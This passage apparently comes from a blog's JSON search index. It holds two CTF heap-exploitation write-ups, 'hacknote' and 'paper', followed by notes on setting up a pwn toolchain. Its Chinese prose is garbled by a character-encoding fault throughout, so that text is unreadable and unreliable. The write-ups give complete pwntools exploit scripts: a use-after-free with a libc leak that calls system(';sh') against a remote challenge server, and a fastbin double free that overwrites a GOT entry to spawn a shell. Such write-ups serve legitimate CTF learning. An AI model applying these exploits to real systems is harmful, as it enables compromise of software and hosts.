†ç®¡ç†æœºåˆ¶ä¸­å­˜åœ¨çš„æ¼æ´ï¼Œä½¿chunk1çš„å†…å®¹å˜å¾—å¯æ§ï¼Œä¸”ä¾ç„¶æ»¡è¶³åŸæ¥å¯æ‰§è¡Œçš„ç‰¹æ€§ã€‚ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ä¸ªä¸åŒçš„å¯¹è±¡æ“ä½œåŒä¸€å—å†…å®¹ï¼Œæœ¬è´¨å°±æ˜¯UAFã€‚\n\n## 3.1 è·å–libcåŸºå€\n\n### 3.1.1 æœ¬åœ°è°ƒè¯•æ—¶libcçš„åŸºå€\næœ¬åœ°è°ƒè¯•æ—¶ï¼Œå¯ä»¥åœ¨gdbä¸­æ–¹ä¾¿åœ°è·å–åˆ°libcçš„åŸºå€ï¼Œä¸º0xf7e07000ã€‚\n![](hacknote-9.png)\n### 3.1.2 æœ¬åœ°åŠ¨æ€è°ƒè¯•ï¼Œè·å–libcä¸­main_arenaç»“æ„ä½“ä¸­topçš„åœ°å€\n**Unsorted binæœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯é“¾è¡¨ä¸­ç¬¬ä¸€ä¸ªchunkçš„fdå’Œbkå‡æŒ‡å‘main_arenaç»“æ„ä½“ä¸­çš„topä½ç½®ã€‚å› æ­¤åªè¦æˆ‘ä»¬æ³„éœ²å‡ºè¿™ä¸ªåœ°å€ï¼ŒåŠ ä¸Šé¢˜ç›®æä¾›çš„libcï¼Œå°±å¯ä»¥è½»æ¾è®¡ç®—å‡ºlibcåœ¨å®é™…åœºæ™¯ä¸­çš„åŸºå€äº†ã€‚**\n\né¦–å…ˆaddä¸€ä¸ª64å­—èŠ‚çš„noteï¼Œå†addä¸€ä¸ª10å­—èŠ‚çš„noteï¼Œç„¶ådeleteæ‰ç¬¬ä¸€ä¸ªnoteã€‚æ­¤ä¸¾çš„ç›®çš„æ˜¯ä½¿ç¬¬ä¸€ä¸ªnoteä¸­å¤§äºfastbinçš„å †å—ä¸è¢«top chunkç»™åˆå¹¶æ‰ï¼Œä»è€Œè¯¥å †å—å¯ä»¥è¿›å…¥unsorted binã€‚\n![](hacknote-10.png)\nå†æ¬¡ç”³è¯·64å­—èŠ‚çš„ç©ºé—´ï¼Œå †ç®¡ç†å™¨ä¼šæŠŠunsorted binä¸­çš„chunkå†æ¬¡åˆ†é…ç»™æˆ‘ä»¬ï¼Œæ­¤æ—¶index 2å’Œindex 0æŒ‡å‘åŒä¸€å—å †å†…å­˜åŒºåŸŸã€‚æ­¤æ—¶è¾“å…¥çš„å†…å®¹åªè¦ä¸è¦†ç›–åˆ°unsorted binä¸­é‚£ä¸ªchunkçš„bkä½ç½®ï¼Œå°±å¯ä»¥åœ¨æˆåŠŸåˆ†é…åï¼Œè°ƒç”¨printæ‰“è¯¥å†…å­˜åŒºåŸŸï¼Œè·å¾—main_arenaä¸­topçš„åœ°å€ï¼ˆåœ°å€æ˜¯ä¸å¯æ˜¾ç¤ºå­—ç¬¦ï¼Œæ‰€ä»¥æ˜¾ç¤ºä¹±ç ï¼‰ã€‚\n![](hacknote-11.png)\n![](hacknote-12.png)\n![](hacknote-13.png)\n### 3.1.3 è¿œç«¯çš„libcä¸­topç›¸å¯¹libcåŸºå€çš„åç§»\n\nLibcåº“ä¸­çš„Malloc_trimå‡½æ•°ä¸­å­˜åœ¨main_arenaç»“æ„ä½“ï¼Œå¦‚ä¸‹å›¾ä½ç½®ï¼š\n\n![](hacknote-14.png)\næŸ¥çœ‹main_arenaåœ¨libcåº“ä¸­çš„åç§»ä¸º0x001B0780ã€‚æŒ‰ç…§main_arenaç»“æ„ä½“ä¸unsorted binçš„å…³ç³»ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå¯çŸ¥ç¬¬ä¸€ä¸ªè¢«å½’æ¡£åˆ°unsorted binçš„chunkï¼Œå…¶fdä¸bkåº”å½“æŒ‡å‘0x001B0780+0x30=0x001B07B0ã€‚\n\n![](hacknote-15.png)\n\nå› æ­¤unsorted binä¸­è¿”å›çš„å€¼ï¼Œä¸libcåŸºå€çš„åç§»ä¸º0x001B07B0ã€‚\n\né‚£ä¹ˆlibc_base = addr(dongtai_top) â€“ 0x001B07B0ï¼Œå› æ­¤åªéœ€è¦ç”¨3.1.2ä¸­çš„æ–¹æ³•å°†topçš„åœ°å€æ³„éœ²å‡ºæ¥ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€å•¦ã€‚\n\n[update]ps.å¦ä¸€ç§ç¡®åˆ‡å¯»æ‰¾topä½ç½®ä¸main arenaè·ç¦»çš„æ–¹æ³•ï¼š\n\n![](hacknote-0418.png)\n\n## 3.2 åŠ«æŒEIP\n>æ€è·¯ï¼šç”³è¯·noteæ—¶ä¼šå»ºç«‹chunk1ï¼ˆ8byteï¼‰å’Œchunk2ï¼ˆè·Ÿchunk1ä¸åŒçš„å¤§å°å°±è¡Œï¼‰ï¼Œè‹¥å†ç”³è¯·ä¸€ä¸ªnoteï¼Œæ­¤æ—¶åˆä¼šå»ºç«‹chunk1`å’Œchunk2`ã€‚å°†è¿™ä¸¤ä¸ªnoteåˆ é™¤åï¼Œchunk1å’Œchunk1`ä¼šè¢«é“¾åˆ°åŒä¸€å¤§å°ï¼ˆ8byteï¼‰çš„fastbinä¸Šï¼Œchunk2å’Œchunk2`ä¼šè¢«é“¾åˆ°å…¶ä»–å¤§å°çš„fastbinä¸Šã€‚å¦‚æœæ­¤æ—¶å†ç”³è¯·ä¸€ä¸ª8byteçš„noteï¼Œå°±ä¼šå°†chunk1`å’Œchunk1åˆ†åˆ«ä½œä¸ºputså‡½æ•°å †å’Œå†…å®¹å †ã€‚è¿™ä¸ªæ—¶å€™ï¼Œchunk1è¢«index 0å’Œindex2åŒæ—¶é”å®šã€‚æˆ‘ä»¬é€šè¿‡index 2 æ›´æ”¹chunk1ä¸­çš„å†…å®¹ï¼Œç„¶åé€šè¿‡index 0 å»æ‰§è¡Œè¢«æ›¿æ¢æ‰çš„å‡½æ•°æŒ‡é’ˆã€‚\n\nå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š\n\nå…ˆç”³è¯·ä¸¤ä¸ªå¤§å°ä¸º30çš„noteï¼Œç„¶ååˆ é™¤æ‰è¿™ä¸¤ä¸ªnote\n![](hacknote-16.png)\nå†addä¸€ä¸ªå¤§å°ä¸º8çš„noteï¼Œæ­¤æ—¶ä¼šå°†fastbinä¸Šå¤§å°ä¸º8çš„chunkè¿›è¡Œåˆ†é…ã€‚å¦‚ä¸‹å›¾ï¼Œä»ä¸Šå¾€ä¸‹ï¼Œç¬¬ä¸€ä¸ªchunkå·²ç»è¢«å†™å…¥555äº†ã€‚\n![](hacknote-17.png)\næ­¤æ—¶print 2å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚print 0 ä¼šæŠ¥æ®µé”™è¯¯ï¼Œeipè¢«è¦†ç›–æˆäº†555ï¼ˆå³æœ€åç”³è¯·å¤§å°ä¸º8çš„å †æ—¶è¾“å…¥çš„contentï¼‰ã€‚è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ§åˆ¶eipæŒ‡é’ˆã€‚\n![](hacknote-18.png)\n![](hacknote-19.png)\n\nEXPå¦‚ä¸‹ï¼š\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./hacknote')\nmylibc = ELF('./libc_32.so.6')\nio = remote('chall.pwnable.tw',10102)\n\ndef add_note(size,content):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"size :\")\n    io.sendline(str(size))\n    io.recvuntil(\"Content :\")\n    io.sendline(content)\n\ndef del_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\ndef print_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\n\nadd_note(64,\"12\")\nadd_note(32,\"12\")\ndel_note(0)\nadd_note(64,\"45\")\nprint_note(2)\n\nlibc_addr = u32(io.recv(8)[4:8]) - 0x1b07b0\nsys_addr = libc_addr + mylibc.symbols['system']\n\n# add_note(8,\"12\")\n# add_note(8,\"34\")\n# del_note(3)\n# del_note(4)\ndel_note(0)\ndel_note(1)\nadd_note(8,p32(sys_addr)+\";sh\\x00\")\nprint_note(0)\nio.interactive()\n\n```\n\n# 4 è®°å½•\n\n## unsorted bin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\n\n\n","tags":["heap","unsortedbin"],"categories":["CTF"]},{"title":"ctfå †å…¥é—¨ - paper","url":"/2020/02/23/paper/","content":"\n[é¢˜ç›®æ–‡ä»¶é“¾æ¥](https://xuanxuanblingbling.github.io/assets/pwn/paper)\n\n# 1ã€å¯»æ‰¾æ¼æ´ç‚¹\n\næ‹¿åˆ°ELFåï¼Œå…ˆçœ‹çœ‹å®ƒçš„ä¸€äº›ä¿¡æ¯ã€‚\n- FileæŸ¥çœ‹æ–‡ä»¶æ ¼å¼\n- ChecksecæŸ¥çœ‹å¼€å¯çš„å®‰å…¨ç¼–è¯‘é€‰é¡¹\n- è¿è¡Œä¸€ä¸‹çœ‹çœ‹éƒ½æœ‰å“ªäº›åŠŸèƒ½\n- ä½¿ç”¨IDAçœ‹çœ‹ä¼ªä»£ç ï¼Œç†è§£æ•´ä¸ªäºŒè¿›åˆ¶ç¨‹åºçš„åŠŸå¹¶æŸ¥æ‰¾æ¼æ´ç‚¹ã€‚\n\n![](paper-1.png)\n\n64ä½ç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ï¼Œæ²¡æœ‰å»ç¬¦å·è¡¨ï¼Œgotè¡¨å¯å†™å¯è¯»ï¼Œå¼€å¯æ ˆä¸å¯æ‰§è¡Œå’Œcanaryä¿æŠ¤ï¼Œæ²¡æœ‰åšåœ°å€éšæœºåŒ–ã€‚\n\n![](paper-2.png)\n\nç¨‹åºæä¾›ä¸¤ä¸ªåŠŸèƒ½ï¼Œå¢åŠ paperå’Œåˆ é™¤paperï¼Œpaperä¸­å¯ä»¥å­˜æ”¾æŒ‡å®šå¤§å°çš„æ•°æ®ã€‚\n\n![](paper-3.png)\n\nIDAæŸ¥çœ‹ç¨‹åºå®ç°ï¼Œå…³æ³¨add_paperå’Œdelete_paperã€‚\n\n![](paper-4.png)\n\nAdd paperä¸­ç”³è¯·ä¸€å—å †ï¼Œç„¶åå­˜æ”¾æ•°æ®ã€‚è¿™ä¸ªå‡½æ•°å®ç°å„é¡¹æ£€æŸ¥éƒ½åšå¾—å¾ˆå¥½ï¼Œæ²¡å‘ç°æ¼æ´ç‚¹ã€‚\n\n![](paper-5.png)\n\nDelete paperä¸­freeæ‰æŒ‡å‘å †çš„`link_list[index]`æŒ‡é’ˆåï¼Œæ²¡æœ‰å°†è¯¥æŒ‡é’ˆç½®NULLã€‚å¯¼è‡´ä¸€ä¸ªæ‚¬ç©ºæŒ‡é’ˆçš„äº§ç”Ÿã€Šå¯¹å‡ ç±»å±é™©çš„æŒ‡é’ˆï¼Œè§æœ¬æ–‡çš„è®°å½•â€”â€”ä¸‰ç±»æ¼æ´æŒ‡é’ˆã€‹ã€‚\n\n# 2ã€åˆ©ç”¨åˆ†æ\n\nå †ç®¡ç†æœºåˆ¶ä¸­ï¼Œå¯¹äºè¾ƒå°çš„å †å—ï¼Œé‡‡ç”¨fastbinçš„æ–¹å¼è¿›è¡Œå›æ”¶ï¼ˆæœ¬é¢˜ä¸­è¦æ±‚å †å—å°äº0x80ï¼Œè¿™æ ·freeæ“ä½œä¹‹åï¼Œè¯¥chunkä¼šè¢«é“¾æ¥åˆ°fastbinä¸Šï¼‰ã€‚æœ¬é¢˜ä¸­ï¼Œç”³è¯·çš„æœ€å¤§å †å†…å­˜ä¸º1024Byteï¼Œæ‰€ä»¥è¦æ§åˆ¶ç”³è¯·çš„å †å¤§å°ä¸è¶…è¿‡0x80ã€‚\n\næ ¹æ®fastbinçš„å•å‘é“¾è¡¨åŠå…¶ä»–ç‰¹æ€§ã€Šè§è®°å½•â€”â€”fastbin attackã€‹ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡double freeåœ¨fastbinçš„é“¾è¡¨ä¸­æ„é€ ä¸€ä¸ªç¯ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚ç„¶åç”³è¯·ä¸€ä¸ªä¸chunk1ã€chunk2ç›¸åŒå¤§å°çš„å †ï¼Œæ­¤æ—¶ä¼šè¿”å›chunk1ç»™çº¿ç¨‹ä½¿ç”¨ï¼Œäºæ˜¯å¯ä»¥æ›´æ”¹chunk1ä¸­çš„æ•°æ®ï¼ˆå¦‚å°†â€œfdâ€ä½ç½®å¤„çš„å€¼æ”¹ä¸ºæˆ‘ä»¬çš„ç›®æ ‡åœ°å€ï¼‰ã€‚ä¸‹ä¸€æ¬¡mallocæ—¶åˆ†é…chunk2ï¼Œå†ä¸‹ä¸€æ¬¡åˆ†é…æ—¶ä¾ç„¶æ˜¯chunk1ï¼Œä½†æ­¤æ—¶main_arenaå·²ç»æŒ‡å‘ç›®æ ‡åœ°å€å¤„ï¼ˆå¦‚æœç›®æ ‡åœ°å€åˆç†ï¼‰äº†ã€‚æ­¤æ—¶å†mallocä¸€æ¬¡ï¼Œå°±å¯ä»¥å®ç°å¯¹è¯¥åœ°å€ç©ºé—´å†™ä»»æ„å€¼äº†ã€‚\n\n![](paper-6.png)\n\nè¿™æ ·æ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯ï¼Œå¾€å“ªé‡Œå†™æ‰èƒ½getshellå‘¢ï¼Ÿ\n\nè¦getshellå°±å¿…é¡»æ§åˆ¶æŒ‡é’ˆçš„æ‰§è¡Œæµï¼Œä½¿å…¶æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„ææƒå‡½æ•°æˆ–è€…ç›´æ¥å»æ‰§è¡Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å·²æœ‰çš„ææƒå‡½æ•°ã€‚\n\nï¼ˆ1ï¼‰å¯»æ‰¾æˆ–æ„é€ ææƒå‡½æ•°ï¼ˆè¿™é‡Œä»¥ELFä¸­è‡ªå¸¦ææƒå‡½æ•°ä¸ºä¾‹ï¼‰\n\nå›åˆ°ELFæ–‡ä»¶ï¼Œæœç´¢â€œ/bin/shâ€æˆ–systemå‡½æ•°ï¼Œçœ‹æ˜¯å¦å­˜åœ¨è¿™ç§åé—¨ï¼Œä½¿åˆ©ç”¨æ›´åŠ ç®€å•ã€‚åœ¨stringçª—å£ä¸­æœç´¢â€œ/bin/shâ€ï¼ŒæŸ¥çœ‹å…¶å¼•ç”¨ggï¼Œå‘ç°ggä¸­ä¼šè°ƒç”¨system(â€œ/bin/shâ€)ã€‚\n\n![](paper-7.png)\n\n![](paper-8.png)\n\n![](paper-9.png)\n\nè‡³æ­¤ï¼Œæˆ‘ä»¬çš„ææƒå‡½æ•°å°±æ‰¾åˆ°äº†ï¼é‚£ä¹ˆæ€æ ·æ‰èƒ½è®©ç¨‹åºæµä¹–ä¹–åœ°æ¥æ‰§è¡Œæˆ‘ä»¬çš„ææƒå‡½æ•°å‘¢ï¼Ÿ\n\nï¼ˆ2ï¼‰æ›¿æ¢å‡½æ•°å†…å®¹æˆ–æ›¿æ¢å‡½æ•°æŒ‡é’ˆï¼ˆè¿™é‡Œä»¥æ›¿æ¢å‡½æ•°æŒ‡é’ˆä¸ºä¾‹ï¼‰\n\t\næ§åˆ¶æ‰§è¡Œæµçš„åšæ³•é€šå¸¸æ˜¯å°†åŸæœ¬è¦æ‰§è¡Œçš„å‡½æ•°è¿›è¡Œæ›¿æ¢ï¼Œæ›¿æ¢å‡½æ•°æŒ‡é’ˆæˆ–è€…æ›¿æ¢æ‰å‡½æ•°å†…å®¹ã€‚\n\nè¿™é‡Œæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªææƒå‡½æ•°ggï¼Œä¸”ELFå¹¶æœªå¼€å¯åœ°å€éšæœºåŒ–ï¼Œé‚£ä¹ˆé¦–å…ˆæƒ³åˆ°çš„æ˜¯æ§åˆ¶æŸä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘ggã€‚ä¹Ÿå°±æ˜¯è¯´è¦æŠŠggå‡½æ•°çš„åœ°å€0x00400943å†™åˆ°æŸä¸ªä¼šè¢«å½“åšâ€œå‡½æ•°æŒ‡é’ˆâ€çš„åœ°å€0x12345678ä¸Šå»ï¼Œè¿™æ ·å½“åŸæœ¬ç¨‹åºæµä»è¯¥0x12345678ä¸Šå–å€¼å¹¶è·³è½¬æ‰§è¡Œæ—¶ï¼Œå°±ä¼šæ‰§è¡Œggå‡½æ•°äº†ã€‚\n\n![](paper-10.png)\n\nå¾€å“ªé‡Œå†™è¿™ä¸ªggå‡½æ•°åœ°å€å‘¢ï¼Ÿå›åˆ°ELFæ–‡ä»¶ï¼Œé€†å‘æŸ¥çœ‹ä¼ªæºç ï¼Œæºç ä¸­å¹¶æœªå®šä¹‰æœ‰ç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œä½†æ˜¯æ ˆä¸Šçš„è¿”å›åœ°å€å¯ä»¥ä½œä¸ºè€ƒè™‘çš„ä¸€ä¸ªé€‰é¡¹ã€‚å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯å»è¦†å†™gotè¡¨äº†ï¼Œå…·ä½“åšæ³•æ˜¯æ›´æ”¹è¯¥gotè¡¨çš„æŸä¸ªè¡¨é¡¹å†…åœ°å€ä¸ºggå‡½æ•°åœ°å€ã€‚è¿™æ ·å½“ç¨‹åºæ‰§è¡Œåˆ°è¯¥gotè¡¨ä¸­å‡½æ•°ï¼ˆå¦‚printfã€putsã€getsç­‰ç­‰ï¼‰æ—¶ï¼Œä¾¿ä¼šå»æ‰§è¡Œæˆ‘ä»¬çš„ææƒå‡½æ•°å•¦ã€‚\n\né‚£ä¹ˆæœ€åï¼Œæ€ä¹ˆè·å–åˆ°gotè¡¨çš„åœ°å€ä»¥åŠè¯¥gotæ¡ç›®çš„åœ°å€å‘¢ï¼Ÿç”±äºæœ¬é¢˜çš„ELFæœªå¼€å¯åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥å¯ç›´æ¥é€šè¿‡IDAæŸ¥çœ‹gotè¡¨çš„èµ·å§‹åœ°å€ä»¥åŠå„è¡¨é¡¹çš„å…·ä½“åœ°å€ã€‚ç„¶è€Œï¼Œå¯¹äºå¼€å¯éšæœºåŒ–çš„ELFï¼Œå°±éœ€è¦æˆ‘ä»¬æƒ³åŠæ³•å»æ³„éœ²gotè¡¨åœ°å€äº†ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨è¿™ç¯‡æ–‡ç« ä¸­ä¸äºˆè®¨è®ºã€‚\n\nå¯ä»¥çœ‹åˆ°è¯¥ELFçš„gotè¡¨æ¡ç›®å¦‚ä¸‹ï¼Œgotè¡¨åœ°å€ä¸º0x00602000ã€‚\n\n![](paper-11.png)\n\nåˆ°è¿™é‡Œåˆ©ç”¨æ€è·¯åŸºæœ¬æ˜ç¡®äº†ï¼Œå°±æ˜¯å°†chunk1ä¸­fdçš„åœ°å€æ›¿æ¢æˆgotè¡¨ä¸­æŸä¸€é¡¹ï¼ˆä¼šæ‰§è¡Œåˆ°çš„å‡½æ•°ï¼‰çš„å€¼ï¼Œç„¶åå°†è¯¥é¡¹çš„å€¼æ”¹æˆggå‡½æ•°åœ°å€ã€‚\n\né‚£ä¹ˆè¿™ä¸ªgotè¡¨ä¸­çš„åœ°å€éœ€ä¸éœ€è¦æ»¡è¶³ä»€ä¹ˆæ¡ä»¶å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¿…é¡»çš„ï¼main_arenaæŠŠchunkä»fastbiné“¾è¡¨ä¸Šå¸ä¸‹æ¥çš„æ—¶å€™ï¼Œä¼šå»æ£€æŸ¥è¯¥chunkä¸­fdæŒ‡å‘çš„å¦ä¸€chunkæ˜¯å¦ä¸ºåˆæ³•chunkã€‚åˆæ³•chunkçš„ç‰¹å¾æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯ç›®æ ‡chunkæ•°æ®åŒºä¹‹å‰çš„å…«ä¸ªå­—èŠ‚ï¼ˆ64ä½ä¸‹ï¼‰å¿…é¡»æ˜¯åˆæ³•çš„sizeå€¼ï¼Œæ ‡å¿—è¿™ä¸ªchunkçš„å¤§å°ã€‚Psï¼šå…¶å®åªè¦è¿™å…«ä¸ªå­—èŠ‚çš„ä½å››å­—èŠ‚æ»¡è¶³å°±å¯ä»¥äº†ã€‚\n\nå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ä¸Šè¿°gotè¡¨ä¸­ï¼Œå¯»æ‰¾æ»¡è¶³è¿™ç§æ¡ä»¶çš„åœ°å€ã€‚å¦‚ä¸‹å›¾ï¼Œæ ‡è®°é¢œè‰²çš„äº”ä¸ªéƒ¨åˆ†æ»¡è¶³ä½å››ä¸ªå­—èŠ‚ä¸º0x00000040æˆ–0x00000060ï¼Œè¿™å¯ä»¥æ˜¯ä¸€ä¸ªåˆæ³•çš„sizeå€¼ã€‚\n\n![](paper-12.png)\n\nä½†æ˜¯é€‰å“ªä¸ªä½œä¸ºç›®æ ‡åœ°å€å‘¢ï¼Œè¿˜éœ€è¦ç»“åˆgotè¡¨é¡¹è¿›è¡Œè€ƒè™‘ã€‚\n\n- é€‰0x602002å¤„ä½œä¸ºchunkçš„sizeéƒ¨åˆ†\n- é€‰0x60201aå¤„ä½œä¸ºchunkçš„sizeéƒ¨åˆ†\n- é€‰0x602032å¤„ä½œä¸ºchunkçš„sizeéƒ¨åˆ†\n- é€‰0x60203aå¤„ä½œä¸ºchunkçš„sizeéƒ¨åˆ†\n\nå¦‚æœæˆ‘ä»¬æƒ³è¦†å†™printfå‡½æ•°ï¼Œå³0x602040å¤„çš„å€¼ï¼Œé‚£ä¹ˆå¾—ä½¿ç”¨0x602032å¤„ä½œä¸ºchunkçš„sizeéƒ¨åˆ†ã€‚æ­¤æ—¶æ•´ä¸ªchunkçš„èµ·å§‹åœ°å€æ˜¯0x60202aã€‚å¯ä»»æ„å†™çš„æ•°æ®åŒºä»0x60203aå¼€å§‹ã€‚ç”±äºsystemå‡½æ•°åœ¨0x602038è‡³0x60203fåŒºé—´ï¼Œå› æ­¤0x60203aè‡³0x60203fçš„å€¼éœ€è¦ä¿æŒä¸å˜ã€‚éœ€è¦å°†0x602040è‡³0x602047çš„å€¼æ”¹ä¸ºggå‡½æ•°åœ°å€ã€‚å› æ­¤éœ€è¦å¾€0x60202aå†™å…¥çš„å†…å®¹ä¸ºï¼š\\x40\\x00\\x00\\x00\\x00\\x00+ggåœ°å€\n\nå› ä¸ºæœ€ç»ˆé€‰æ‹©çš„chunk sizeï¼ˆåŒ…å«chunkå¤´ï¼‰ä¸º0x40ï¼Œæ‰€ä»¥ç”³è¯·çš„å †å†…å­˜å¤§å°å¿…é¡»æ˜¯0x30ã€‚æ¥ä¸‹æ¥å¯ä»¥å†™åˆ©ç”¨ä»£ç äº†ã€‚\n\n# 3ã€EXP\n\n```python\nfrom pwn import *\ncontext(os=\"linux\",arch=\"amd64\",log_level=\"debug\")\n\ne = ELF(\"./paper\")\nio = process(e.path)\n\ndef add_paper(index,length,content):\n    io.recv()\n    io.sendline(\"1\")\n    io.recv()\n    io.sendline(str(index))\n    io.recv()\n    io.sendline(str(length))\n    io.recv()\n    io.sendline(content)\n\ndef delete_paper(index):\n    io.recv()\n    io.sendline(\"2\")\n    io.recv()\n    io.sendline(str(index))\n    \nadd_paper(1,0x30,\"111\")\nadd_paper(2,0x30,\"222\")\n\ndelete_paper(1)\ndelete_paper(2)\ndelete_paper(1)\n\nadd_paper(3,0x30,p64(0x0060202a))\nadd_paper(4,0x30,\"444\")\nadd_paper(5,0x30,\"555\")\nadd_paper(6,0x30,\"\\x40\\x00\\x00\\x00\\x00\\x00\"+p64(e.symbols[\"gg\"]))\n\nio.recv()\nio.sendline(\"t\")\nio.interactive()\n\n```\n\næ‰§è¡ŒæˆåŠŸï¼Œgetshellï¼\n\n![](paper-13.png)\n\n# 4ã€è®°å½•\n\n## ä¸‰ç±»æ¼æ´æŒ‡é’ˆ\n\n1ã€ç©ºæŒ‡é’ˆï¼šæŒ‡å‘NULLçš„æŒ‡é’ˆï¼Œè‹¥ä½¿ç”¨æŒ‡é’ˆå‰æœªåˆ¤æ–­å…¶æ˜¯å¦ä¸ºç©ºï¼Œå¯å¯¼è‡´ç¨‹åºå´©æºƒã€‚\n\n2ã€æ‚¬ç©ºæŒ‡é’ˆï¼šä¹Ÿç§°è¿·é€”æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€æ®µå·²é‡Šæ”¾çš„å†…å­˜å•å…ƒçš„æŒ‡é’ˆï¼Œå¯å¯¼è‡´UAFç­‰æ¼æ´ã€‚\n\n3ã€é‡æŒ‡é’ˆï¼šæŒ‡å‘ä¸€æ®µæœªåˆå§‹åŒ–å†…å­˜å•å…ƒçš„æŒ‡é’ˆã€‚\n\n## fastbin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/\n\n\n## GOTè¡¨ä¸PLT\n\nhttps://blog.csdn.net/qq_18661257/article/details/54694748\n\nhttps://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n## pwntoolsçš„ä½¿ç”¨\n\nhttps://www.cnblogs.com/Ox9A82/p/5728149.html\n\n\n\n# 5 æ–°æœºæ­å»ºpwnç¯å¢ƒ\n\nç”±äºè¿™é¢˜å¿…é¡»åœ¨ubunut1804ç¯å¢ƒä¸‹åˆ©ç”¨ï¼Œæ‰€ä»¥æ•´ä¸ªpwnçš„åšé¢˜ç¯å¢ƒåˆéœ€è¦é‡æ–°æ­ä¸€éã€‚ä¸ºäº†ä»¥åå†é‡åˆ°è¿™ç§æƒ…å†µæ—¶ï¼Œå¯ä»¥è¿…é€Ÿå®Œæˆç¯å¢ƒæ­å»ºï¼Œè¿™é‡Œåšä¸€ä¸‹è®°å½•ã€‚\n\n## å®‰è£…pwntools\n\n```shell\napt-get update\napt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n```\n\n## å®‰è£…checksec\n\n```shell\ngit clone https://github.com/slimm609/checksec.sh.git\ncd checksec.sh\nsudo cp checksec /usr/bin/checksec\n```\n\næ–°ç‰ˆä½¿ç”¨æ–¹æ³•ï¼š\n\n```shell\nchecksec --file=filename\n```\n\n## å®‰è£…pwndbg\n\n```shell\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\nsudo ./setup.sh\n```\n\n## å®‰è£…gef\n\nubuntuä¸­ä¸‹è½½gef.pyä¸æˆåŠŸï¼Œå› æ­¤è·‘å»githubç›´æ¥ä¸‹è½½æºæ–‡ä»¶ï¼š\n\n[gefç½‘å€](https://github.com/hugsy/gef)\n\n```shell\n# ä¸‹è½½gef.pyè‡³/home/xxxç”¨æˆ·æ ¹ç›®å½•\n$ mv gef.py .gdbinit-gef.py\n$ echo \"source ~/.gdbinit-gef.py\" >> ~/.gdbinit\n```\n\n## å®‰è£…peda\n\n[pedaç½‘å€](https://github.com/longld/peda)\n\n```shell\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n```\n\n## å®‰è£…ROPGadget\n\n```shell\nsudo pip install capstone\ngit clone https://github.com/JonathanSalwan/ROPgadget.git\ncd ROPgadget\nsudo python3 setup.py install\n```\n\n## å®‰è£…one_gadget\n\n```shell\n$ sudo apt -y install ruby\n$ sudo gem install one_gadget \n```\n\n## å®‰è£…LibcSearcher\n\n```shell\ngit clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\nsudo python3 setup.py develop\n```\n\n## å®‰è£…32ä½libc\n\næ–¹ä¾¿è¿è¡Œ32ä½ç¨‹åºï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\nï¼ˆ1ï¼‰\n\n```shell\nsudo dpkg --add-architecture i386\nsudo apt-get update\nsudo apt-get install libc6:i386\nsudo apt-get install libgtk2.0-0:i386\n```\n\nï¼ˆ2ï¼‰\n\n```shell\n# ç¬¬ä¸€æ­¥ï¼Œç¡®è®¤ç³»ç»Ÿçš„æ¶æ„\ndpkg --print-architecture  \n# ç¬¬äºŒæ­¥ï¼Œç¡®è®¤æ‰“å¼€äº†å¤šæ¶æ„æ”¯æŒåŠŸèƒ½\npkg --print-foreign-architectures \n# ç¬¬ä¸‰æ­¥ï¼Œå®‰è£…å¯¹åº”çš„32ä½åº“\nsudo apt-get dist-upgrade #è¿™ä¸€æ­¥æ˜¯æ›´æ–°æ‰€æœ‰çš„è½¯ä»¶ï¼Œå¦‚æœä½ å¯¹æ–°ç‰ˆæœ¬è½¯ä»¶çš„éœ€æ±‚ä¸æ˜¯é‚£ä¹ˆè¿«åˆ‡ï¼Œå¯ä»¥ä¸æ‰§è¡Œ \n#å®‰è£…ç›¸å…³åº“  \nsudo apt-get install lib32z1 lib32ncurses5-dev #æœ‰çš„è¿˜éœ€è¦32ä½stdc++åº“lib32stdc++6-4.8-dbg\n#å®‰è£…gcc multilab  \nsudo apt-get install gcc-multilib g++-multilib  